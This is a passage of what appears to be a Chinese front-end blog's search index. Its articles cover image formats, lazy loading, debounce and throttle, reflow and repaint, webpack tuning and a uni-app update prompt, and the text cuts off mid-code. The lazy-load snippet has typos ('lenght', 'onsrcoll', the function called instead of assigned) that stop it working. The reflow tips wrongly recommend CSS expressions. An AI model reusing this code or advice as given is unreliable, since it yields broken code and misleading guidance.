title=\"常见的图片格式及使用场景\"></a>常见的图片格式及使用场景</h5><ol>\n<li><p>BMP：是无损的、既支持索引色也支持直接色的点阵图。这种图片格式几乎没有对数据进行压缩，所以 BMP 格式的图片通常是较大的文件。</p>\n</li>\n<li><p>GIF：是无损的、采用索引色的点阵图。采用 LZW 压缩算法进行<br>编码。文件小，是 GIF 格式的优点，同时，GIF 格式还具有支持动画<br>以及透明的优点。但是 GIF 格式仅支持 8bit 的索引色，所以 GIF 格<br>式适用于对色彩要求不高同时需要文件体积较小的场景。</p>\n</li>\n<li><p>JPEG：是有损的、采用直接色的点阵图。JPEG 的图片的优点是采用了直接色，得益于更丰富的色彩，JPEG 非常适合用来存储照片，与 GIF 相比，JPEG 不适合用来存储企业 Logo、线框类的图。因为有损压缩会导致图片模糊，而直接色的选用，又会导致图片文件较 GIF 更大。</p>\n</li>\n<li><p>PNG-8：是无损的、使用索引色的点阵图。PNG 是一种比较新的图片格式，PNG-8 是非常好的 GIF 格式替代者，在可能的情况下，应该尽可能的使用 PNG-8 而不是 GIF，因为在相同的图片效果下，PNG-8 具有更小的文件体积。除此之外，PNG-8 还支持透明度的调节，而 GIF 并不支持。除非需要动画的支持，否则没有理由使用 GIF 而不是 PNG-8。</p>\n</li>\n<li><p>PNG-24：是无损的、使用直接色的点阵图。PNG-24 的优点在于它压缩了图片的数据，使得同样效果的图片，PNG-24 格式的文件大小要比 BMP 小得多。当然，PNG24 的图片还是要比 JPEG、GIF、PNG-8 大得多。</p>\n</li>\n<li><p>SVG 是无损的矢量图。SVG 是矢量图意味着 SVG 图片由直线和曲线以及绘制它们的方法组成。当放大 SVG 图片时，看到的还是线和曲线，而不会出现像素点。这意味着 SVG 图片在放大时，不会失真，所以它非常适合用来绘制 Logo、Icon 等。</p>\n</li>\n<li><p>WebP：是谷歌开发的一种新图片格式，WebP 是同时支持有损和无损压缩的、使用直接色的点阵图。从名字就可以看出来它是为 Web 而生的，什么叫为 Web 而生呢？就是说相同质量的图片，WebP 具有更小的文件体积。现在网站上充满了大量的图片，如果能够降低每一个图片的文件大小，那么将大大减少浏览器和服务器之间的数据传输量，进而降低访问延迟，提升访问体验。目前只有 Chrome 浏览器和 Opera 浏览器支持 WebP 格式，兼容性不太好。</p>\n</li>\n</ol>\n<p>在无损压缩的情况下，相同质量的 WebP 图片，文件大小要比 PNG 小 26%；<br>在有损压缩的情况下，具有相同图片精度的 WebP 图片，文件大小要比 JPEG 小 25%~34%；</p>\n<p>WebP 图片格式支持图片透明度，一个无损压缩的 WebP 图片，如果要支持透明度只需要 22% 的格外文件大小。</p>\n","categories":["浏览器","性能优化"],"tags":["前端","浏览器","性能优化","Webpack","图片"]},{"title":"前端懒加载是什么？","url":"//web/lazy/loading.html","content":"<h5 id=\"懒加载的概念\"><a href=\"#懒加载的概念\" class=\"headerlink\" title=\"懒加载的概念\"></a>懒加载的概念</h5><p>懒加载也叫做延迟加载、按需加载，指的是在长网页中延迟加载图片数据，是一种较好的网页性能优化的方式。在比较长的网页或应用中，如果图片很多，所有的图片都被加载出来，而用户只能看到可视窗口的那一部分图片数据，这样就浪费了性能。<br>如果使用图片的懒加载就可以解决以上问题。在滚动屏幕之前，可视化区域之外的图片不会进行加载，在滚动屏幕时才加载。这样使得网页的加载速度更快，减少了服务器的负载。懒加载适用于图片较多，页面列表较长（长列表）的场景中。</p>\n<h5 id=\"懒加载的特点\"><a href=\"#懒加载的特点\" class=\"headerlink\" title=\"懒加载的特点\"></a>懒加载的特点</h5><ul>\n<li>减少无用资源的加载：使用懒加载明显减少了服务器的压力和流量，同时也减小了浏览器的负担。</li>\n<li>提升用户体验：如果同时加载较多图片，可能需要等待的时间较长，这样影响了用户体验，而使用懒加载就能大大的提高用户体验。</li>\n<li>防止加载过多图片而影响其他资源文件的加载：会影响网站应用的正常使用。</li>\n</ul>\n<h5 id=\"懒加载的实现原理\"><a href=\"#懒加载的实现原理\" class=\"headerlink\" title=\"懒加载的实现原理\"></a>懒加载的实现原理</h5><p>图片的加载是由 src 引起的，当对 src 赋值时，浏览器就会请求图片资源。根据这个原理，我们使用 HTML5 的 data-xxx 属性来储存图片的路径，在需要加载图片的时候，将 data-xxx 中图片的路径赋值给 src，这样就实现了图片的按需加载，即懒加载。</p>\n<p><strong>注意</strong>：data-xxx 中的 xxx 可以自定义，这里我们使用 data-src 来定义。</p>\n<p>懒加载的实现重点在于确定用户需要加载哪张图片，在浏览器中，可视区域内的资源就是用户需要的资源。所以当图片出现在可视区域时，获取图片的真实地址并赋值给图片即可。</p>\n<p>使用原生 JavaScript 实现懒加载：</p>\n<p><strong>知识点</strong>：</p>\n<p>window.innerHeight 是浏览器可视区的高度</p>\n<p>document.body.scrollTop</p>\n<p>document.documentElement.scrollTop 是浏览器滚动的过的距离</p>\n<p>imgs.offsetTop 是元素顶部距离文档顶部的高度（包括滚动条的距离）</p>\n<p>图片加载条件 ： img.offsetTop &lt; window.innerHeight+document.body.scrollTop;</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6533ccf1c458853aef92497a.png\" alt=\"在这里插入图片描述\"></p>\n<p>代码实现：</p>\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">'container'</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">'loading.gif'</span> <span class=\"attr\">data-src</span>=<span class=\"string\">'pic.png'</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">'loading.gif'</span> <span class=\"attr\">data-src</span>=<span class=\"string\">'pic.png'</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">'loading.gif'</span> <span class=\"attr\">data-src</span>=<span class=\"string\">'pic.png'</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">'loading.gif'</span> <span class=\"attr\">data-src</span>=<span class=\"string\">'pic.png'</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">'loading.gif'</span> <span class=\"attr\">data-src</span>=<span class=\"string\">'pic.png'</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">'loading.gif'</span> <span class=\"attr\">data-src</span>=<span class=\"string\">'pic.png'</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> imgs = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelectorAll</span>(<span class=\"string\">'img'</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">function</span> <span class=\"title function_\">lazyLoad</span>(<span class=\"params\"></span>) {</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">var</span> scrollTop = <span class=\"variable language_\">document</span>.<span class=\"property\">body</span>.<span class=\"property\">scrollTop</span> || <span class=\"variable language_\">document</span>.<span class=\"property\">documentElement</span>.<span class=\"property\">scrollTop</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">var</span> winHeight = <span class=\"variable language_\">window</span>.<span class=\"property\">innerHeight</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; imgs.<span class=\"property\">lenght</span>; i++) {</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">if</span>(imgs[i].<span class=\"property\">offsetTop</span> &lt; scrollTop + winHeight) {</span></span><br><span class=\"line\"><span class=\"language-javascript\">                imgs[i].<span class=\"property\">src</span> = imgs[i].<span class=\"title function_\">getAttribute</span>(<span class=\"string\">'data-src'</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">            }</span></span><br><span class=\"line\"><span class=\"language-javascript\">        }</span></span><br><span class=\"line\"><span class=\"language-javascript\">    }</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"variable language_\">window</span>.<span class=\"property\">onsrcoll</span> = <span class=\"title function_\">lazyLoad</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n","categories":["浏览器","性能优化"],"tags":["前端","浏览器","性能优化"]},{"title":"节流和防抖","url":"//web/lodash/dubounce.html","content":"<h4 id=\"对节流与防抖的理解\"><a href=\"#对节流与防抖的理解\" class=\"headerlink\" title=\"对节流与防抖的理解\"></a>对节流与防抖的理解</h4><p>函数防抖是指在事件被触发 n 秒后再执行回调，如果在这 n 秒内事件<br>又被触发，则重新计时。这可以使用在一些点击请求的事件上，避免因<br>为用户的多次点击向后端发送多次请求。<br>函数节流是指规定一个单位时间，在这个单位时间内，只能有一次触发<br>事件的回调函数执行，如果在同一个单位时间内某事件被触发多次，只<br>有一次能生效。节流可以使用在 scroll 函数的事件监听上，通过事件<br>节流来降低事件调用的频率。</p>\n<p>防抖函数的应用场景：</p>\n<ul>\n<li>按钮提交场景：防止多次提交按钮，只执行最后一次提交</li>\n<li>服务端验证场景： 表达验证需要服务端配合，只执行一段连续的输入事件的最后一次，还有索联想词功能类似生存环境可以使用 lodash.debounce</li>\n</ul>\n<p>节流函数的适用场景：</p>\n<ul>\n<li>拖拽场景：固定实际内只执行一次，防止超高频次触发位置变动</li>\n<li>缩放场景：监控浏览器 resize</li>\n<li> 动画场景：避免短时间内多次触发动画引起性能问题</li>\n</ul>\n<h4 id=\"实现节流函数和防抖函数\"><a href=\"#实现节流函数和防抖函数\" class=\"headerlink\" title=\"实现节流函数和防抖函数\"></a>实现节流函数和防抖函数</h4><h5 id=\"函数防抖的实现\"><a href=\"#函数防抖的实现\" class=\"headerlink\" title=\"函数防抖的实现\"></a>函数防抖的实现</h5><figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">debounce</span>(<span class=\"params\">fn, wait</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> timer = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">function</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"number\">123</span>);</span><br><span class=\"line\">        <span class=\"keyword\">let</span> context = <span class=\"variable language_\">this</span>, args = [...<span class=\"variable language_\">arguments</span>];</span><br><span class=\"line\">        <span class=\"comment\">// 如果此时存在定时器则取消之前的定时器重新计时</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(timer) {</span><br><span class=\"line\">            <span class=\"built_in\">clearTimeout</span>(timer);</span><br><span class=\"line\">            timer = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        }</span><br><span class=\"line\">        timer = <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">            fn.<span class=\"title function_\">apply</span>(context, args);</span><br><span class=\"line\">        }, wait);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<h5 id=\"函数节流的实现\"><a href=\"#函数节流的实现\" class=\"headerlink\" title=\"函数节流的实现\"></a>函数节流的实现</h5><figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 时间戳版</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">throttle</span>(<span class=\"params\">fn, delay</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">var</span> preTime = <span class=\"title class_\">Date</span>.<span class=\"title function_\">now</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">function</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">        <span class=\"keyword\">var</span> context = <span class=\"variable language_\">this</span>,</span><br><span class=\"line\">        args = [...<span class=\"variable language_\">arguments</span>],</span><br><span class=\"line\">        nowTime = <span class=\"title class_\">Date</span>.<span class=\"title function_\">now</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 如果两次时间间隔超过了指定时间，则执行函数。</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(nowTime - preTime &gt;= delay) {</span><br><span class=\"line\">            preTime = <span class=\"title class_\">Date</span>.<span class=\"title function_\">now</span>();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> fn.<span class=\"title function_\">apply</span>(context, args);</span><br><span class=\"line\">        }</span><br><span class=\"line\">    };</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 定时器版</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">throttle</span>(<span class=\"params\">fu, wait</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> timer = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">function</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">        <span class=\"keyword\">let</span> context = <span class=\"variable language_\">this</span>,</span><br><span class=\"line\">        args = [...<span class=\"variable language_\">arguments</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!timer) {</span><br><span class=\"line\">            timer = <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">                fu.<span class=\"title function_\">apply</span>(context, args);</span><br><span class=\"line\">                <span class=\"built_in\">clearTimeout</span>(timer);</span><br><span class=\"line\">            }, wait);</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n","categories":["浏览器","性能优化"],"tags":["前端","浏览器","性能优化"]},{"title":"浅谈回流与重绘","url":"//web/reflux/and/redrawing.html","content":"<h5 id=\"回流\"><a href=\"#回流\" class=\"headerlink\" title=\"回流\"></a>回流</h5><p>当渲染树中部分或者全部元素的尺寸、结构或者属性发生变化时，浏览器会重新渲染部分或者全部文档的过程就称为回流。<br>下面这些操作会导致回流：</p>\n<ul>\n<li>页面的首次渲染</li>\n<li>浏览器的窗口大小发生变化</li>\n<li>元素的内容发生变化</li>\n<li>元素的尺寸或者位置发生变化</li>\n<li>元素的字体大小发生变化</li>\n<li>激活 CSS 伪类</li>\n<li>查询某些属性或者调用某些方法</li>\n<li>添加或者删除可见的 DOM 元素</li>\n</ul>\n<p>在触发回流（重排）的时候，由于浏览器渲染页面是基于流式布局的，所以当触发回流时，会导致周围的 DOM 元素重新排列，它的影响范围有两种：<br>全局范围：从根节点开始，对整个渲染树进行重新布局<br>局部范围：对渲染树的某部分或者一个渲染对象进行重新布局</p>\n<h5 id=\"重绘\"><a href=\"#重绘\" class=\"headerlink\" title=\"重绘\"></a>重绘</h5><p>当页面中某些元素的样式发生变化，但是不会影响其在文档流中的位置时，浏览器就会对元素进行重新绘制，这个过程就是重绘。</p>\n<p>下面这些操作会导致重绘：<br>color、background 相关属性：background-color、background-image 等<br>outline 相 关 属 性 ： outline-color 、outline-width、text-decoration<br>border-radius、visibility、box-shadow</p>\n<p>注意： 当触发回流时，一定会触发重绘，但是重绘不一定会引发回流。</p>\n<h5 id=\"如何避免回流与重绘？\"><a href=\"#如何避免回流与重绘？\" class=\"headerlink\" title=\"如何避免回流与重绘？\"></a>如何避免回流与重绘？</h5><p>减少回流与重绘的措施：</p>\n<p>操作 DOM 时，尽量在低层级的 DOM 节点进行操作不要使用 table 布局， 一个小的改动可能会使整个 table 进行重新布局</p>\n<p>使用 CSS 的表达式</p>\n<p>不要频繁操作元素的样式，对于静态页面，可以修改类名，而不是样式。</p>\n<p>使用 absolute 或者 fixed，使元素脱离文档流，这样他们发生变化就不会影响其他元素</p>\n<p>避免频繁操作 DOM，可以创建一个文档片段 documentFragment，在它上面应用所有 DOM 操作，最后再把它添加到文档中</p>\n<p>将元素先设置 display: none，操作结束后再把它显示出来。因为在 display 属性为 none 的元素上进行的 DOM 操作不会引发回流和重绘。将 DOM 的多个读操作（或者写操作）放在一起，而不是读写操作穿插着写。这得益于浏览器的渲染队列机制。</p>\n<p>浏览器针对页面的回流与重绘，进行了自身的优化 —— 渲染队列浏览器会将所有的回流、重绘的操作放在一个队列中，当队列中的操作到了一定的数量或者到了一定的时间间隔，浏览器就会对队列进行批处理。这样就会让多次的回流、重绘变成一次回流重绘。</p>\n<p>上面，将多个读操作（或者写操作）放在一起，就会等所有的读操作进入队列之后执行，这样，原本应该是触发多次回流，变成了只触发一次回流。</p>\n","categories":["浏览器","性能优化"],"tags":["前端","浏览器","性能优化"]},{"title":"如何⽤ webpack 来优化前端性能？","url":"//web/webpack/perform.html","content":"<h5 id=\"如何⽤webpack-来优化前端性能？\"><a href=\"#如何⽤webpack-来优化前端性能？\" class=\"headerlink\" title=\"如何⽤webpack 来优化前端性能？\"></a>如何⽤ webpack 来优化前端性能？</h5><p>⽤ webpack 优化前端性能是指优化 webpack 的输出结果，让打包的最终结果在浏览器运⾏快速⾼效。</p>\n<ul>\n<li>压缩代码：删除多余的代码、注释、简化代码的写法等等⽅式。可以利⽤ webpack 的 UglifyJsPlugin 和 ParallelUglifyPlugin 来压缩 JS ⽂件， 利⽤ cssnano （css-loader?minimize）来压缩 css；</li>\n<li>利⽤ CDN 加速：在构建过程中，将引⽤的静态资源路径修改为 CDN 上对应的路径。可以利⽤ webpack 对于 output 参数和各 loader 的 publicPath 参数来修改资源路径；</li>\n<li>Tree Shaking: 将代码中永远不会⾛到的⽚段删除掉。可以通过在启动 webpack 时追加参数 –optimize-minimize 来实现；</li>\n<li>Code Splitting: 将代码按路由维度或者组件分块 (chunk), 这样做到按需加载，同时可以充分利⽤浏览器缓存；</li>\n<li>提取公共第三⽅库: SplitChunksPlugin 插件来进⾏公共模块抽取，利⽤浏览器缓存可以⻓期缓存这些⽆需频繁变动的公共代码。</li>\n</ul>\n<h5 id=\"如何提⾼webpack-的构建速度？\"><a href=\"#如何提⾼webpack-的构建速度？\" class=\"headerlink\" title=\"如何提⾼webpack 的构建速度？\"></a>如何提⾼ webpack 的构建速度？</h5><ol>\n<li>多⼊⼝情况下，使⽤ CommonsChunkPlugin 来提取公共代码；</li>\n<li>通过 externals 配置来提取常⽤库；</li>\n<li>利⽤ DllPlugin 和 DllReferencePlugin 预编译资源模块 通过 DllPlugin 来对那些我们引⽤但是绝对不会修改的 npm 包来进⾏预编译，再通过 DllReferencePlugin 将预编译的模块加载进来；</li>\n<li>使⽤ Happypack 实现多线程加速编译；</li>\n<li>使⽤ webpack-uglify-parallel 来提升 uglifyPlugin 的压缩速度。原理上 webpack-uglify-parallel 采⽤了多核并⾏压缩来提升压缩速度；</li>\n<li>使⽤ Tree-shaking 和 Scope Hoisting 来剔除多余代码。</li>\n</ol>\n","categories":["浏览器","性能优化"],"tags":["前端","浏览器","性能优化","Webpack","插件"]},{"title":"uni-app APP 更新版本提示","url":"//uni-app/vue/update.html","content":"<h3 id=\"AppUpdate-方法\"><a href=\"#AppUpdate-方法\" class=\"headerlink\" title=\"AppUpdate 方法\"></a>AppUpdate 方法</h3><figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> baseUrl <span class=\"keyword\">from</span> <span class=\"string\">'@/basecall/utils.js'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">AppUpdate</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> appleId = <span class=\"number\">2021004105638058</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> _this = <span class=\"variable language_\">this</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> platform = uni.<span class=\"title function_\">getSystemInfoSync</span>().<span class=\"property\">platform</span>;</span><br><span class=\"line\">  <span class=\"comment\">//1. 获取当前版本号</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> curversion = <span class=\"number\">100</span>;</span><br><span class=\"line\">  plus.<span class=\"property\">runtime</span>.<span class=\"title function_\">getProperty</span>(plus.<span class=\"property\">runtime</span>.<span class=\"property\">appid</span>, <span class=\"keyword\">function</span> (<span class=\"params\">widgetInfo</span>) {</span><br><span class=\"line\">    curversion = widgetInfo.<span class=\"property\">version</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"当前版本\"</span>, curversion);</span><br><span class=\"line\">  });</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\">    2， 用当前版本号提交给服务端，判断是否需要更新，接口返回信息如下</span></span><br><span class=\"line\"><span class=\"comment\">        versionId\t\tinteger(int64)\t</span></span><br><span class=\"line\"><span class=\"comment\">        versionId\t版本号\tstring\t</span></span><br><span class=\"line\"><span class=\"comment\">        intro\t版本描述\tstring\t</span></span><br><span class=\"line\"><span class=\"comment\">        forced\t是否强制更新\tboolean\t</span></span><br><span class=\"line\"><span class=\"comment\">        news\t是否是最新版本\tboolean\t</span></span><br><span class=\"line\"><span class=\"comment\">        url\tapk地址\tstring\t</span></span><br><span class=\"line\"><span class=\"comment\">        createTime\t创建时间</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">  uni.<span class=\"title function_\">request</span>({</span><br><span class=\"line\">    <span class=\"attr\">url</span>: baseUrl.<span class=\"property\">baseUrl</span> + <span class=\"string\">\"/getVersion\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">method</span>: <span class=\"string\">\"GET\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">success</span>: <span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> {</span><br><span class=\"line\">      <span class=\"keyword\">const</span> { versionId, forced, url, createTime } = res.<span class=\"property\">data</span>.<span class=\"property\">data</span>;</span><br><span class=\"line\">\t  uni.<span class=\"title function_\">setStorageSync</span>(<span class=\"string\">'url'</span>, url);</span><br><span class=\"line\">      <span class=\"keyword\">let</span> currTimeStamp = <span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>(createTime).<span class=\"title function_\">getTime</span>();</span><br><span class=\"line\">      <span class=\"comment\">/* 判断是否是最新版 */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (versionId !== curversion) {</span><br><span class=\"line\">        <span class=\"comment\">//forced true 强制更新 false 自然更新</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (forced == <span class=\"string\">'true'</span>) {</span><br><span class=\"line\">          uni.<span class=\"title function_\">showModal</span>({</span><br><span class=\"line\">            <span class=\"attr\">title</span>: <span class=\"string\">\"紧急升级通知\"</span>,</span><br><span class=\"line\">            <span class=\"attr\">content</span>:</span><br><span class=\"line\">              <span class=\"string\">\"亲爱的用户，为了提供更好的使用体验与功能改进，我们进行了系统升级。请立即完成强制升级，否则将无法正常使用APP。感谢您的配合与支持！\"</span>,</span><br><span class=\"line\">            <span class=\"attr\">confirmText</span>: <span class=\"string\">\"立即更新\"</span>,</span><br><span class=\"line\">            <span class=\"attr\">showCancel</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">            <span class=\"attr\">success</span>: <span class=\"keyword\">function</span> (<span class=\"params\">res</span>) {</span><br><span class=\"line\">              <span class=\"keyword\">if</span> (res.<span class=\"property\">confirm</span>) {</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (platform == <span class=\"string\">\"ios\"</span>) {</span><br><span class=\"line\">                  plus.<span class=\"property\">runtime</span>.<span class=\"title function_\">launchApplication</span>(</span><br><span class=\"line\">                    {</span><br><span class=\"line\">                      <span class=\"attr\">action</span>: <span class=\"string\">`itms-apps://itunes.apple.com/cn/app/id<span class=\"subst\">${appleId}</span>?mt=8`</span>,</span><br><span class=\"line\">                    },</span><br><span class=\"line\">                    <span class=\"keyword\">function</span> (<span class=\"params\">e</span>) {</span><br><span class=\"line\">                      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(</span><br><span class=\"line\">                        <span class=\"string\">\"Open system default browser failed: \"</span> + e.<span class=\"property\">message</span></span><br><span class=\"line\">                      );</span><br><span class=\"line\">                    }</span><br><span class=\"line\">                  );</span><br><span class=\"line\">                } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">                  uni.<span class=\"title function_\">showToast</span>({</span><br><span class=\"line\">                    <span class=\"attr\">icon</span>: <span class=\"string\">\"none\"</span>,</span><br><span class=\"line\">                    <span class=\"attr\">mask</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">                    <span class=\"attr\">title</span>: <span class=\"string\">\"有新的版本发布，程序已启动自动更新。\"</span>,</span><br><span class=\"line\">                    <span class=\"attr\">duration</span>: <span class=\"number\">5000</span>,</span><br><span class=\"line\">                  });</span><br><span class=\"line\">                  <span class=\"comment\">//设置 最新版本apk的下载链接 这是固定的</span></span><br><span class=\"line\">                  <span class=\"keyword\">let</span> downloadApkUrl = url;</span><br><span class=\"line\">                  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(downloadApkUrl);</span><br><span class=\"line\">                  plus.<span class=\"property\">runtime</span>.<span class=\"title function_\">openURL</span>(downloadApkUrl);</span><br><span class=\"line\">                }</span><br><span class=\"line\">              }</span><br><span class=\"line\">            },</span><br><span class=\"line\">          });</span><br><span class=\"line\">        } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">          uni.<span class=\"title function_\">getStorage</span>({</span><br><span class=\"line\">            <span class=\"attr\">key</span>: <span class=\"string\">\"tip_version_update_time\"</span>,</span><br><span class=\"line\">            <span class=\"attr\">success</span>: <span class=\"keyword\">function</span> (<span class=\"params\">res</span>) {</span><br><span class=\"line\">              <span class=\"keyword\">var</span> lastTimeStamp = res.<span class=\"property\">data</span>; <span class=\"comment\">// 本地时间戳</span></span><br><span class=\"line\">              <span class=\"keyword\">var</span> tipTimeLength = <span class=\"number\">0</span>; <span class=\"comment\">// 时间间隔</span></span><br><span class=\"line\">              <span class=\"keyword\">let</span> cha = lastTimeStamp + tipTimeLength - currTimeStamp;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> (lastTimeStamp + tipTimeLength &gt; currTimeStamp) {</span><br><span class=\"line\">                <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"当后台时间戳大于本地时间戳才会进入\"</span>);</span><br><span class=\"line\">              } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">                <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"立即更新\"</span>);</span><br><span class=\"line\">                <span class=\"comment\">//重新设置时间戳</span></span><br><span class=\"line\">                uni.<span class=\"title function_\">setStorage</span>({</span><br><span class=\"line\">                  <span class=\"attr\">key</span>: <span class=\"string\">\"tip_version_update_time\"</span>,</span><br><span class=\"line\">                  <span class=\"attr\">data</span>: currTimeStamp,</span><br><span class=\"line\">                  <span class=\"attr\">success</span>: <span class=\"keyword\">function</span> (<span class=\"params\"></span>) {</span><br><span class=\"line\">                    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"setStorage-success\"</span>);</span><br><span class=\"line\">                  },</span><br><span class=\"line\">                });</span><br><span class=\"line\"></span><br><span class=\"line\">                uni.<span class=\"title function_\">showModal</span>({</span><br><span class=\"line\">                  <span class=\"attr\">title</span>: <span class=\"string\">\"版本更新\"</span>,</span><br><span class=\"line\">                  <span class=\"attr\">content</span>:</span><br><span class=\"line\">                    <span class=\"string\">\"尊敬的用户，我们为您准备了最新的版本更新，内含诸多新功能与用户体验优化。点击立即升级，享受更多精彩和便利。\"</span>,</span><br><span class=\"line\">                  <span class=\"attr\">confirmText</span>: <span class=\"string\">\"立即更新\"</span>,</span><br><span class=\"line\">                  <span class=\"attr\">cancelText</span>: <span class=\"string\">\"取消\"</span>,</span><br><span class=\"line\">                  <span class=\"attr\">success</span>: <span class=\"keyword\">function</span> (<span class=\"params\">res</span>) {</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (res.<span class=\"property\">confirm</span>) {</span><br><span class=\"line\">                      <span class=\"keyword\">if</span> (platform == <span class=\"string\">\"ios\"</span>) {</span><br><span class=\"line\">                        plus.<span class=\"property\">runtime</span>.<span class=\"title function_\">launchApplication</span>(</span><br><span class=\"line\">                          {</span><br><span class=\"line\">                            <span class=\"attr\">action</span>: <span class=\"string\">`itms-apps://itunes.apple.com/cn/app/id<span class=\"subst\">${appleId}</span>?mt=8`</span>,</span><br><span class=\"line\">                          },</span><br><span class=\"line\">                          <span class=\"keyword\">function</span> (<span class=\"params\">e</span>) {</span><br><span class=\"line\">                            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(</span><br><span class=\"line\">                              <span class=\"string\">\"Open system default browser failed: \"</span> + e.<span class=\"property\">message</span></span><br><span class=\"line\">                            );</span><br><span class=\"line\">                          }</span><br><span class=\"line\">                        );</span><br><span class=\"line\">                      } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">                        uni.<span class=\"title function_\">showToast</span>({</span><br><span class=\"line\">                          <span 